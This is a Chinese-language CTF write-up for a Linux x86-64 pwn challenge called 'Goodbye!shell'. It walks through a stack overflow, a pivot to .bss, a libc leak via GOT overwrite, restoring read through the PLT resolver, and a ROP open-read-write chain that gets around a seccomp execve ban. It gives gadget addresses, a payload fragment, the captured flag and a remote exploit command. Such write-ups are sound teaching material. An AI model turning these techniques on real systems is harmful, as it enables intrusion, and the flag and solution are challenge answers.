# 2-1 Goodbye!shell — Writeup

## 题目信息

- 类型：PWN / Linux x86-64
- 保护：NX on、No PIE、No Canary、Partial RELRO、SHSTK/IBT on
- seccomp：仅 `execve(59)`、`execveat(322)` 被 KILL，其余全部 ALLOW
- 漏洞：`read(0, rbp-0x20, 0x30)` → 只能溢出 16 字节（saved rbp + ret）

## 关键难点

1. 没有 `pop rdi/rsi/rdx`、没有 `syscall`、没有 `jmp rsp`（全字节扫描确认）；
2. 可写数据段很小（GOT + 8 字节 bss），但 **ELF RW 段最后一页 0x404000-0x405000 整页可写**（bss 后的零填充，实测 0x404800/0x404f00 均可写）；
3. 每连接 ASLR 重新随机（并发 3 连接实测 3 个不同 libc 基址）；
4. 泄漏与利用互斥：`read@got` 被改成 `write` 后无法再读入第二阶段。

## 利用链

### 第 1 步：把 main 的栈迁到 .bss（已知地址）

`_start` 里有一段天然 gadget：

```
4010d9: pop rsi            ; argc
4010da: mov rdx, rsp       ; argv
4010dd: and rsp, -16
4010e1: push rax
4010e2: push rsp
4010e5: xor r8d, r8d
4010e8: xor ecx, ecx
4010ea: mov rdi, main
4010ed: call __libc_start_main
```

把溢出后的 `rbp` 设为 `0x404f00` 一带，ret 走 `leave;ret` 跳到 `0x4010d9`，即可让
`__libc_start_main` 在 **.bss 页**上重新调用 main：

- 此时 main/sandbox/vuln 的整个栈都在 `0x404000-0x405000`（固定地址、可写、约 4KB）；
- 主程序再次打印 `Give me your name:`，说明栈迁移成功。

```python
payload = b'A'*0x20 + p64(0x404f20) + p64(READ_SITE)   # 先把 0x30 字节写到 .bss
# 0x404f00: rbp=0x404f38, [0x404f08]=0x401070(read .plt), [0x404f10]=READ_SITE
# 0x404f20: 0x404058, 0x404f28: READ_SITE
```

### 第 2 步：泄漏 libc

把 `read@got` 改成 `write@plt`（`0x4010a0`，`.plt.sec` 直接 `jmp [write@got]`，**不经过 resolver**），
read-site 的 `read` 就变成 `write(0, rbp-0x20, 0x30)`：

```
rbp=0x404040 → write(0, 0x404020, 0x30) → 泄漏 GOT[0x404020..0x40404f]
write@got → libc base = write - 0x1149c0
```

### 第 3 步：恢复 read（PLT 解析器写回 GOT）

`.plt` 的桩是 `push N; jmp PLT0`，走 `_dl_runtime_resolve`，解析结果会**写回**对应 GOT 槽：

```
0x401050: push 2 (write)
0x401070: push 4 (read)   ← 解析 read 并把真实地址写回 read@got
```

从**高位 .bss 栈**（0x404f00 附近）跳 `0x401070`，resolver 有足够栈空间（约 0x200 字节），
既恢复 `read@got`，又顺便调用 `read(1, 0x402004, 9)`（EFAULT，无害）。

### 第 4 步：短 ROP 引导 + 大 read

在 .bss 分三块（每块 0x30）写入引导链：

```
E(0x404800): [E+0x28] = pop rdi
A(0x404830): 0 ; pop rsi ; 0x404900 ; pop rdx;pop r12
B(0x404860): read ; pop rsp ; 0x404900
```

`pop rdx; pop r12` 正好消耗 A 块的两个 pivot 槽（值分别是 B+0x20 和 READ_SITE），
于是 `read(0, 0x404900, 大数)` 一次性把完整 ORW 链 + "/flag" + 缓冲区写进 .bss，
再 `pop rsp; 0x404900` 执行。

### 第 5 步：ORW 读 flag

```
pop rdi; "/flag"(0x404d00) ; pop rsi; 0 ; open
pop rdi; 3 ; pop rsi; buf ; pop rdx;pop r12(0x100,0) ; read
pop rdi; 1 ; pop rsi; buf ; pop rdx;pop r12(0x100,0) ; write
```

## Flag

```
DASCTF{64231435304070781972390276669958}
```

## 利用脚本

`2026/work/2-1/exp3.py`（本地 socketpair / 远程通用）：

```bash
python3 exp3.py          # 本地
python3 exp3.py remote   # 远程 1.14.76.59:19026
```

## 踩坑记录

- 本地用 `process()` 时 stdin 是管道，`write(0,...)` 会 EBADF；必须用 **socketpair** 测试；
- resolver 的 xsave 区约 0x200 字节，栈指针必须落在 `.bss` 高位（0x404f00+），
  否则会撞到 0x403ff8 的 RELRO 只读页；
- 分块写 ROP 时，每块的 `[W+0x20]/[W+0x28]` 会被 read-site 的 pivot 强制写成
  `(下一轮 rbp, READ_SITE)`，需要把这些槽设计成链上有意义的数据（如 `pop rdx;pop r12` 的操作数）。
